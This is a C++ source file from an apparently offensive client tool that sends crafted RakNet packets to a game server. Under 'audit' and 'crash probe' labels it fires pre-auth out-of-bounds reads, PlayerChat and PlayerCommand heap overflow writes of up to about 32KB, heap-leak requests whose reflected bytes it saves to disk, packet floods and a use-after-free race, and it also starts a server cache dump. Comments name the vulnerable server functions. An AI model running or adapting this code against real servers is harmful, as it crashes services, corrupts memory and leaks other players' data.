            WriteRemoteEventPacket(bs, "rag_split_stress", "armed");
            SendBitStream(bs, "send normal remote event packet 0xD2 0x23", IMMEDIATE_PRIORITY);
            log.Push(LogLevel::Success, "normal remote event sent, split stress is armed");
            log.Status("ARMED normal remote event sent");
        }

        void SendHeapDumpProbe()
        {
            RakNet::BitStream bs;
            WriteUpperPacketHeader(bs, UPG_REMOTE_EVENT);
            if(cfg.audit_probe == "biz_order_dump_remote")
            {
                WriteU64LE(bs, XxHash64(std::string("biz.order.add")));
                WriteU16LE(bs, 4);
                for(const std::string& value : {std::string("0"), std::string("X"), std::string("0")})
                {
                    bs.Write(static_cast<uint8_t>(0x13));
                    WriteLenBytes(bs, value);
                }
            }
            else
            {
                WriteU64LE(bs, XxHash64(std::string("rag_heap_dump")));
                WriteU16LE(bs, 1);
            }
            bs.Write(static_cast<unsigned char>(0x18));
            WriteU16LE(bs, static_cast<uint16_t>(cfg.heap_dump_bytes));
            if(cfg.audit_probe == "biz_order_dump_remote")
            {
                const std::string marker = "RGXDUMP1";
                bs.WriteAlignedBytes(reinterpret_cast<const unsigned char*>(marker.data()),
                    static_cast<unsigned int>(marker.size()));
            }
            ++heap_dump_requests;
            SendBitStream(bs, "heap dump request " + std::to_string(heap_dump_requests), IMMEDIATE_PRIORITY);
            log.Status("HEAP_DUMP request=" + std::to_string(heap_dump_requests)
                + " claimed_bytes=" + std::to_string(cfg.heap_dump_bytes));
        }

        bool IsHashScanMode() const
        {
            return cfg.audit_probe == "hash_echo_scan" || cfg.audit_probe == "repo_event_scan";
        }

        void SendRepoPreflight()
        {
            RakNet::BitStream bs;
            std::string tag;
            if(scan_preflight_index == 0)
            {
                WriteRemoteEventPacket(bs, "promocodes.activate", "RGX90000-NO-SUCH-PROMO");
                tag = "REPO_SCAN preflight promocodes.activate invalid string marker=RGX90000";
            }
            else if(scan_preflight_index == 1)
            {
                WriteUpperPacketHeader(bs, UPG_REMOTE_EVENT);
                WriteU64LE(bs, XxHash64(std::string("biz.menu.open")));
                WriteU16LE(bs, 0);
                tag = "REPO_SCAN preflight biz.menu.open argc=0";
            }
            else if(scan_preflight_index == 2)
            {
                WriteRemoteEventPacket(bs, "biz.sell.check", "1000001");
                tag = "REPO_SCAN preflight biz.sell.check invalid id=1000001";
            }
            else if(scan_preflight_index == 3)
            {
                WriteUpperPacketHeader(bs, UPG_REMOTE_EVENT);
                WriteU64LE(bs, XxHash64(std::string("biz.order.add")));
                WriteU16LE(bs, 4);
                for(const std::string& value : {std::string("0"), std::string("X"), std::string("0")})
                {
                    bs.Write(static_cast<uint8_t>(0x13));
                    WriteLenBytes(bs, value);
                }
                bs.Write(static_cast<uint8_t>(0x18));
                WriteU16LE(bs, static_cast<uint16_t>(cfg.event_scan_claimed_bytes));
                const std::string marker = "RGX90001";
                bs.WriteAlignedBytes(reinterpret_cast<const unsigned char*>(marker.data()), static_cast<unsigned int>(marker.size()));
                tag = "REPO_SCAN preflight biz.order.add NaN count, reflected blob marker=RGX90001 claimed="
                    + std::to_string(cfg.event_scan_claimed_bytes);
            }
            else
            {
                return;
            }
            SendBitStream(bs, tag, IMMEDIATE_PRIORITY);
            log.Status(tag);
            ++scan_preflight_index;
            if(scan_preflight_index == 4 && event_scan_names.empty())
                hash_scan_done_at = std::chrono::steady_clock::now() + std::chrono::seconds(5);
        }

        void SendHashEchoScanProbe()
        {
            static constexpr uint64_t ids[] = {
                0xf9a3573ba473ddfbULL,
                0x1f7475b4c618fc84ULL,
                0x9f85289188bd3397ULL,
                0x1c336d27e459f49eULL,
                0x8f1e205764539da2ULL,
                0x685054b3bca809bfULL
            };
            const bool repo = cfg.audit_probe == "repo_event_scan";
            const size_t count = repo ? event_scan_names.size() : sizeof(ids) / sizeof(ids[0]);
            if(hash_scan_index >= count)
                return;

            const uint64_t id = repo ? XxHash64(event_scan_names[hash_scan_index]) : ids[hash_scan_index];
            std::string marker = "RGX" + std::to_string(10000 + hash_scan_index);
            RakNet::BitStream bs;
            WriteUpperPacketHeader(bs, UPG_REMOTE_EVENT);
            WriteU64LE(bs, id);
            WriteU16LE(bs, 1);
            bs.Write(static_cast<unsigned char>(0x18));
            WriteU16LE(bs, static_cast<uint16_t>(repo ? cfg.event_scan_claimed_bytes : 256));
            bs.WriteAlignedBytes(reinterpret_cast<const unsigned char*>(marker.data()), static_cast<unsigned int>(marker.size()));

            std::ostringstream tag;
            tag << "HASH_SCAN tx index=" << hash_scan_index << " id=0x" << std::hex << id
                << " marker=" << marker;
            if(repo)
                tag << " name=" << event_scan_names[hash_scan_index];
            SendBitStream(bs, tag.str(), IMMEDIATE_PRIORITY);
            log.Status(tag.str());
            ++hash_scan_index;
            if(hash_scan_index == count)
                hash_scan_done_at = std::chrono::steady_clock::now() + std::chrono::seconds(5);
        }

        void LogHashScanIncoming(const unsigned char* data, size_t size)
        {
            if(data == nullptr || size < 11)
                return;
            uint64_t id = 0;
            for(size_t i = 0; i < 8; ++i)
                id |= static_cast<uint64_t>(data[3 + i]) << (8 * i);

            std::string matched;
            const size_t count = cfg.audit_probe == "repo_event_scan" ? event_scan_names.size() + 2 : 6;
            for(size_t index = 0; index < count; ++index)
            {
                std::string marker = cfg.audit_probe == "repo_event_scan" && index >= event_scan_names.size()
                    ? "RGX" + std::to_string(90000 + index - event_scan_names.size())
                    : "RGX" + std::to_string(10000 + index);
                if(std::search(data, data + size, marker.begin(), marker.end()) != data + size)
                {
                    matched = marker + ":raw";
                    break;
                }
                std::string hex;
                static constexpr char digits[] = "0123456789abcdef";
                for(unsigned char value : marker)
                {
                    hex.push_back(digits[value >> 4]);
                    hex.push_back(digits[value & 15]);
                }
                for(size_t pos = 0; pos + hex.size() <= size; ++pos)
                {
                    bool equal = true;
                    for(size_t j = 0; j < hex.size(); ++j)
                    {
                        unsigned char c = data[pos + j];
                        if(c >= 'A' && c <= 'F')
                            c = static_cast<unsigned char>(c - 'A' + 'a');
                        if(c != static_cast<unsigned char>(hex[j]))
                        {
                            equal = false;
                            break;
                        }
                    }
                    if(equal)
                    {
                        matched = marker + ":hex";
                        break;
                    }
                }
                if(!matched.empty())
                    break;
            }

            std::ostringstream out;
            out << "HASH_SCAN rx id=0x" << std::hex << id << std::dec << " bytes=" << size;
            if(!matched.empty())
                out << " marker=" << matched;
            log.Push(matched.empty() ? LogLevel::Network : LogLevel::Success, out.str());
            if(!matched.empty())
            {
                log.Status(out.str());
                if(id == XxHash64(std::string("biz.order.ans")))
                {
                    const auto marker = matched.substr(0, matched.find(':'));
                    const auto path = ExeDir() / ("echo-" + marker + ".bin");
                    std::ofstream capture(path, std::ios::binary | std::ios::trunc);
                    if(capture)
                    {
                        capture.write(reinterpret_cast<const char*>(data), static_cast<std::streamsize>(size));
                        capture.close();
                        log.Status("REPO_SCAN captured echo=" + path.string() + " bytes=" + std::to_string(size));
                    }
                }
            }
        }

        void SendAuditProbe()
        {
            const std::string& probe = cfg.audit_probe;
            if(probe == "baseline" || probe == "conn09" || probe == "conn09_seed")
            {
                log.Status("AUDIT baseline connected without upper probe");
                return;
            }

            if(probe == "event_valid")
            {
                RakNet::BitStream valid;
                WriteRemoteEventPacket(valid, "rag_test", "A2OK");
                SendBitStream(valid, "audit event_valid", IMMEDIATE_PRIORITY);
                log.Push(LogLevel::Network, "audit payload: " + ToHex(valid.GetData(), valid.GetNumberOfBytesUsed(), 128));
                log.Status("AUDIT event_valid sent");
                return;
            }

            RakNet::BitStream bs;
            if(probe == "short_d2")
            {
                bs.Write(static_cast<unsigned char>(0xD2));
            }
            else if(probe == "short_d2_2")
            {
                bs.Write(static_cast<unsigned char>(0xD2));
                bs.Write(static_cast<unsigned char>(0x23));
            }
            else if(probe == "voice71_short" || probe == "voice71_valid")
            {
                WriteUpperPacketHeader(bs, 0x71);
                WriteU16LE(bs, 1);
                if(probe == "voice71_valid")
                {
                    WriteU16LE(bs, 0);
                    bs.Write(static_cast<unsigned char>(0x55));
                }
            }
            else
            {
                WriteUpperPacketHeader(bs, UPG_REMOTE_EVENT);
                WriteU64LE(bs, XxHash64(std::string("rag_test")));
                WriteU16LE(bs, 1);

                if(probe == "scalar32_short" || probe == "scalar32_valid")
                {
                    bs.Write(static_cast<unsigned char>(0x0F));
                    if(probe == "scalar32_valid")
                        WriteU32LE(bs, 0x11223344);
                }
                else if(probe == "scalar64_short" || probe == "scalar64_valid")
                {
                    bs.Write(static_cast<unsigned char>(0x10));
                    if(probe == "scalar64_valid")
                        WriteU64LE(bs, 0x1122334455667788ULL);
                }
                else if(probe == "float32_short" || probe == "float32_valid")
                {
                    bs.Write(static_cast<unsigned char>(0x12));
                    if(probe == "float32_valid")
                        WriteU32LE(bs, 0x3F800000);
                }
                else if(probe == "blob16_short" || probe == "blob4_valid" || probe == "blob256_short" || probe == "blob256_short_pre_spawn" || probe == "blob30000_short" || probe == "blob65535_short")
                {
                    bs.Write(static_cast<unsigned char>(0x18));
                    uint16_t claimed = probe == "blob4_valid" ? 4 : probe == "blob16_short" ? 16 : (probe == "blob256_short" || probe == "blob256_short_pre_spawn") ? 256 : probe == "blob30000_short" ? 30000 : 65535;
                    WriteU16LE(bs, claimed);
                    if(probe == "blob4_valid")
                    {
                        const unsigned char body[4] = {0x41, 0x42, 0x43, 0x44};
                        bs.WriteAlignedBytes(body, 4);
                    }
                }
                else
                {
                    log.Push(LogLevel::Error, "unknown audit probe: " + probe);
                    return;
                }
            }

            SendBitStream(bs, "audit " + probe, IMMEDIATE_PRIORITY);
            log.Push(LogLevel::Network, "audit payload: " + ToHex(bs.GetData(), bs.GetNumberOfBytesUsed(), 128));
            log.Status("AUDIT " + probe + " sent");
        }

        void PumpAndSleep(uint32_t ms)
        {
            for(uint32_t elapsed = 0; elapsed < ms && state == ConnState::Connected; elapsed += 30)
            {
                Pump();
                Sleep(30);
            }
        }

        void SendPreAuthProbe()
        {
            // 3-byte 0x03: InitViewUnchecked(bs, data+3, 0) → totalBits=0
            // Server ReadBits fills with zeros; ReadBit reads 1 byte OOB past the empty buffer
            RakNet::BitStream bs;
            WriteUpperPacketHeader(bs, UPG_AUTH_HELLO);
            SendBitStream(bs, "probe0: 0xD2/0x03 zero-body pre-auth OOB", IMMEDIATE_PRIORITY);
            log.Push(LogLevel::Warn, "probe0: truncated pre-auth 0x03 sent (InitViewUnchecked a3=0)");
            Sleep(50);
        }

        void SendCrashProbes()
        {
            log.Push(LogLevel::Warn, "=== crash probes: firing ===");

            // Probe A: argc=0 safe baseline — tests event routing, no args, no OOB
            {
                RakNet::BitStream bs;
                WriteUpperPacketHeader(bs, UPG_REMOTE_EVENT);
                WriteU64LE(bs, XxHash64(std::string("rag_test")));
                WriteU16LE(bs, 0);
                SendBitStream(bs, "probeA: 0x23 argc=0 safe baseline", IMMEDIATE_PRIORITY);
                log.Push(LogLevel::Warn, "probeA: safe argc=0 baseline sent");
            }

            PumpAndSleep(1200);
            if(state != ConnState::Connected)
            {
                log.Push(LogLevel::Warn, "=== probe: disconnected after probeA ===");
                return;
            }

            // Probe H: 0x10 PlayerChat wchar_count=16 → 10-byte heap OOB write
            // ReadUtf16StringFromBitStream: sub_1412AD0D0(a2,0) resizes to 22 bytes,
            // then BitStream__ReadBits writes 16*2=32 bytes → 10 bytes past end
            {
                RakNet::BitStream bs;
                WriteUpperPacketHeader(bs, 0x10);
                WriteU16LE(bs, static_cast<uint16_t>(0x0010));
                for(int i = 0; i < 0x10; ++i)
                    WriteU16LE(bs, static_cast<uint16_t>(0x4141));
                SendBitStream(bs, "probeH: 0x10 wchar=16 heap OOB write +10 bytes", IMMEDIATE_PRIORITY);
                log.Push(LogLevel::Warn, "probeH: 0x10 PlayerChat 16-wchar heap overflow sent");
            }

            PumpAndSleep(1200);
            if(state != ConnState::Connected)
            {
                log.Push(LogLevel::Warn, "=== probe: disconnected after probeH ===");
                return;
            }

            // Probe I: 0x10 PlayerChat wchar_count=512 → 1002-byte heap OOB write
            {
                RakNet::BitStream bs;
                WriteUpperPacketHeader(bs, 0x10);
                WriteU16LE(bs, static_cast<uint16_t>(0x0200));
                for(int i = 0; i < 0x0200; ++i)
                    WriteU16LE(bs, static_cast<uint16_t>(0x4141));
                SendBitStream(bs, "probeI: 0x10 wchar=512 heap OOB write +1002 bytes", IMMEDIATE_PRIORITY);
                log.Push(LogLevel::Warn, "probeI: 0x10 PlayerChat 512-wchar heap overflow sent");
            }

            PumpAndSleep(1200);
            if(state != ConnState::Connected)
            {
                log.Push(LogLevel::Warn, "=== probe: disconnected after probeI ===");
                return;
            }

            // Probe J: 0x11 PlayerCommand wchar_count=0x4000 → ~32KB heap OOB write
            {
                RakNet::BitStream bs;
                WriteUpperPacketHeader(bs, 0x11);
                WriteU16LE(bs, static_cast<uint16_t>(0x4000));
                for(int i = 0; i < 0x4000; ++i)
                    WriteU16LE(bs, static_cast<uint16_t>(0x4141));
                SendBitStream(bs, "probeJ: 0x11 wchar=16384 catastrophic heap OOB write ~32KB", IMMEDIATE_PRIORITY);
                log.Push(LogLevel::Warn, "probeJ: 0x11 PlayerCommand 16384-wchar heap overflow sent");
            }

            PumpAndSleep(1200);
            if(state != ConnState::Connected)
            {
                log.Push(LogLevel::Warn, "=== probe: disconnected after probeJ ===");
                return;
            }

            // Probe B: 0x18 len=16 — small OOB heap read (16 bytes past packet end)
            {
                RakNet::BitStream bs;
                WriteUpperPacketHeader(bs, UPG_REMOTE_EVENT);
                WriteU64LE(bs, XxHash64(std::string("rag_test")));
                WriteU16LE(bs, 1);
                bs.Write(static_cast<uint8_t>(0x18));
                WriteU16LE(bs, static_cast<uint16_t>(0x0010));
                SendBitStream(bs, "probeB: 0x23/0x18 len=0x10 small OOB", IMMEDIATE_PRIORITY);
                log.Push(LogLevel::Warn, "probeB: 0x18 len=16 sent");
            }

            PumpAndSleep(1200);
            if(state != ConnState::Connected)
            {
                log.Push(LogLevel::Warn, "=== probe: disconnected after probeB ===");
                return;
            }

            // Probe C: 0x18 len=256 — medium OOB heap read
            {
                RakNet::BitStream bs;
                WriteUpperPacketHeader(bs, UPG_REMOTE_EVENT);
                WriteU64LE(bs, XxHash64(std::string("rag_test")));
                WriteU16LE(bs, 1);
                bs.Write(static_cast<uint8_t>(0x18));
                WriteU16LE(bs, static_cast<uint16_t>(0x0100));
                SendBitStream(bs, "probeC: 0x23/0x18 len=0x100 medium OOB", IMMEDIATE_PRIORITY);
                log.Push(LogLevel::Warn, "probeC: 0x18 len=256 sent");
            }

            PumpAndSleep(1200);
            if(state != ConnState::Connected)
            {
                log.Push(LogLevel::Warn, "=== probe: disconnected after probeC ===");
                return;
            }

            // Probe D: 0x18 len=16384 — large OOB, still below 64KB stdout pipe buffer
            {
                RakNet::BitStream bs;
                WriteUpperPacketHeader(bs, UPG_REMOTE_EVENT);
                WriteU64LE(bs, XxHash64(std::string("rag_test")));
                WriteU16LE(bs, 1);
                bs.Write(static_cast<uint8_t>(0x18));
                WriteU16LE(bs, static_cast<uint16_t>(0x4000));
                SendBitStream(bs, "probeD: 0x23/0x18 len=0x4000 large OOB", IMMEDIATE_PRIORITY);
                log.Push(LogLevel::Warn, "probeD: 0x18 len=16384 sent");
            }

            PumpAndSleep(1200);
            if(state != ConnState::Connected)
            {
                log.Push(LogLevel::Warn, "=== probe: disconnected after probeD ===");
                return;
            }

            // Probe E: 0x18 len=0xFFFF — full 65535-byte OOB, exceeds 64KB pipe buffer
            {
                RakNet::BitStream bs;
                WriteUpperPacketHeader(bs, UPG_REMOTE_EVENT);
                WriteU64LE(bs, XxHash64(std::string("rag_test")));
                WriteU16LE(bs, 1);
                bs.Write(static_cast<uint8_t>(0x18));
                WriteU16LE(bs, static_cast<uint16_t>(0xFFFF));
                SendBitStream(bs, "probeE: 0x23/0x18 len=0xFFFF full OOB", IMMEDIATE_PRIORITY);
                log.Push(LogLevel::Warn, "probeE: 0x18 len=65535 sent");
            }

            PumpAndSleep(1200);
            if(state != ConnState::Connected)
            {
                log.Push(LogLevel::Warn, "=== probe: disconnected after probeE ===");
                return;
            }

            // Probe F: rapid flood x10 of 0x18/0xFFFF
            log.Push(LogLevel::Warn, "probeF: flooding 10x 0x18/0xFFFF");
            for(int i = 0; i < 10 && state == ConnState::Connected; ++i)
            {
                RakNet::BitStream bs;
                WriteUpperPacketHeader(bs, UPG_REMOTE_EVENT);
                WriteU64LE(bs, XxHash64(std::string("rag_test")));
                WriteU16LE(bs, 1);
                bs.Write(static_cast<uint8_t>(0x18));
                WriteU16LE(bs, static_cast<uint16_t>(0xFFFF));
                SendBitStream(bs, "probeF[" + std::to_string(i) + "]: flood 0x18/0xFFFF", IMMEDIATE_PRIORITY);
            }

            PumpAndSleep(1200);
            if(state != ConnState::Connected)
            {
                log.Push(LogLevel::Warn, "=== probe: disconnected after probeF ===");
                return;
            }

            // Probe G: rapid flood x15 of 0x38 nameLen=0xFFFF (UAF race via ParsePlayerIdentitySyncPacket38)
            log.Push(LogLevel::Warn, "probeG: flooding 15x 0x38 nameLen=0xFFFF");
            for(int i = 0; i < 15 && state == ConnState::Connected; ++i)
            {
                RakNet::BitStream bs;
                WriteUpperPacketHeader(bs, UPG_IDENTITY);
                WriteU16LE(bs, static_cast<uint16_t>(0xFFFF));
                SendBitStream(bs, "probeG[" + std::to_string(i) + "]: 0x38 nameLen=0xFFFF", IMMEDIATE_PRIORITY);
            }

            PumpAndSleep(1200);
            if(state != ConnState::Connected)
            {
                log.Push(LogLevel::Warn, "=== probe: disconnected after probeG ===");
                return;
            }

            log.Push(LogLevel::Warn, "=== crash probes: all sent, monitoring server response ===");
            log.Status("PROBE crash probes fired");
        }

        void StartSplitStress()
        {
            if(split_stress_thread.joinable())
                return;

            if(split_fuzzer::OnlyPreallocEnabled(cfg))
            {
                update_thread_split_state = {};
                update_thread_split_payload = split_fuzzer::BuildPayload(64);
                update_thread_split_stress = true;
                log.Push(LogLevel::Warn, "split stress update-thread prealloc started");
                log.Status("STRESS split stress update-thread prealloc started");
                return;
            }

            RakNet::RakPeerInterface* peer_copy = peer;
            RakNet::SystemAddress server_copy = server_address;
            split_stress_thread = std::thread([this, peer_copy, server_copy]()
            {
                if(cfg.split_stress_after_event_delay_ms)
                    Sleep(cfg.split_stress_after_event_delay_ms);
                log.Status("STRESS split stress started");
                split_fuzzer::Run(log, peer_copy, server_copy, cfg, stop_split_stress);
            });
        }

        void StopSplitStress()
        {
            stop_split_stress.store(true, std::memory_order_relaxed);
            update_thread_split_stress = false;

            if(split_stress_thread.joinable())
                split_stress_thread.join();
        }

        void StartCacheDump()
        {
            std::string host;
            unsigned short port = 0;
            if(!ParseIpPort(cfg.server, host, port))
            {
                log.Push(LogLevel::Warn, "cache dump skipped: bad server ip:port");
                return;
            }

            if(port == 65535)
            {
                log.Push(LogLevel::Warn, "cache dump skipped: invalid fastdl port");
                return;
            }

            fastdl::StartCacheDumpAsync(host, static_cast<unsigned short>(port + 1), ExeDir());
            log.Push(LogLevel::Info, "cache dump started: http://" + host + ":" + std::to_string(port + 1) + "/list2");
        }
    };
}
